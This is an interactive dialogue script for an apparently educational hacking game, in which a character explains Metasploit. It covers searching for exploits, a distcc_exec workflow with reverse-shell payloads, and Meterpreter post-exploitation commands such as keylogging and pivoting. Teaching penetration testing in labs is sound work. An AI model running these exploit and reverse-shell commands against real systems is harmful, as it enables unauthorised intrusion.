// Metasploit Framework - Reusable Explanations
// Used across multiple scenarios

=== metasploit_what_is_it ===
Haxolottle: Metasploit is your exploitation toolkit, little axolotl.

Haxolottle: It's a framework with thousands of exploits, payloads, and post-exploitation tools all in one place.

Haxolottle: Think of it as a Swiss Army knife for hacking.

+ [How do I start using it?]
    -> metasploit_getting_started

+ [What can it do?]
    -> metasploit_capabilities

+ [Got it]
    -> DONE

=== metasploit_getting_started ===
Haxolottle: Start the console: msfconsole

Haxolottle: It takes a moment to load - over 2000 exploits to initialize.

Haxolottle: Once you're in, you'll see the msf > prompt. That's your command center.

+ [How do I find exploits?]
    Haxolottle: Use search: search apache or search platform:windows

    Haxolottle: You can search by name, platform, CVE number, whatever you know about the target.

    Haxolottle: Try: search cve:2021-3156 to find a specific vulnerability.

+ [How do I use an exploit?]
    -> metasploit_exploitation_workflow

+ [Show me the basic workflow]
    -> metasploit_exploitation_workflow

+ [That's enough for now]
    -> DONE

=== metasploit_capabilities ===
Haxolottle: Metasploit does it all, really.

Haxolottle: Exploitation: Thousands of exploits for every platform - Windows, Linux, web apps, you name it.

Haxolottle: Payloads: After exploitation, what do you want? A shell? Meterpreter? Execute a command?

Haxolottle: Post-exploitation: Once you're in, gather info, escalate privileges, pivot to other systems.

Haxolottle: It even has auxiliary modules for scanning, fuzzing, and denial of service.

+ [Tell me about the workflow]
    -> metasploit_exploitation_workflow

+ [What's Meterpreter?]
    -> meterpreter_intro

+ [I get the idea]
    -> DONE

=== metasploit_exploitation_workflow ===
Haxolottle: Here's the standard workflow:

Haxolottle: 1. Search for an exploit: search distcc

Haxolottle: 2. Select it: use exploit/unix/misc/distcc_exec

Haxolottle: 3. Check options: show options

Haxolottle: 4. Set required options: set RHOST 10.0.0.5 and set LHOST YOUR_IP

Haxolottle: 5. Choose a payload: show payloads, then set PAYLOAD cmd/unix/reverse

Haxolottle: 6. Launch: exploit or run

+ [What's RHOST and LHOST?]
    Haxolottle: RHOST is the remote host - your target's IP address.

    Haxolottle: LHOST is your local host - your Kali machine's IP, where shells connect back to.

    Haxolottle: Always double-check these before running an exploit!

+ [What if the exploit doesn't work?]
    Haxolottle: First, run show options again and verify everything is set correctly.

    Haxolottle: Check that the target is actually running the vulnerable service.

    Haxolottle: Some exploits are unreliable or version-specific. Try a different one.

+ [Tell me about payloads]
    -> metasploit_payloads

+ [Clear enough]
    -> DONE

=== metasploit_payloads ===
Haxolottle: Payloads are what happens after exploitation succeeds.

Haxolottle: Simple shells: windows/shell/reverse_tcp or cmd/unix/reverse

Haxolottle: These give you a basic command prompt on the target.

Haxolottle: Meterpreter: windows/meterpreter/reverse_tcp or linux/x86/meterpreter/reverse_tcp

Haxolottle: Meterpreter is way more powerful - file upload/download, keylogging, process migration, you name it.

+ [When should I use which payload?]
    Haxolottle: For quick access and simple commands, use regular shells.

    Haxolottle: For post-exploitation work - gathering intel, escalating privileges, pivoting - use Meterpreter.

    Haxolottle: Meterpreter is also more stable and has better error handling.

+ [Tell me more about Meterpreter]
    -> meterpreter_intro

+ [Got it]
    -> DONE

=== meterpreter_intro ===
Haxolottle: Meterpreter is Metasploit's advanced payload.

Haxolottle: It runs entirely in memory - no files written to disk, harder to detect.

Haxolottle: It's dynamically extensible - load features as you need them.

Haxolottle: And it has tons of built-in commands for everything you'd want to do post-exploitation.

+ [What commands does Meterpreter have?]
    Haxolottle: Type help after getting a Meterpreter shell to see them all.

    Haxolottle: Key ones: getuid (current user), ps (processes), migrate (switch processes)

    Haxolottle: File operations: ls, cd, download, upload, cat

    Haxolottle: System: sysinfo, getprivs, shell (drop to OS shell)

+ [How do I get a Meterpreter shell?]
    Haxolottle: Just use a Meterpreter payload when exploiting.

    Haxolottle: Like: set PAYLOAD windows/meterpreter/reverse_tcp

    Haxolottle: Then exploit normally. You'll get a meterpreter > prompt instead of a system shell.

+ [I understand]
    -> DONE
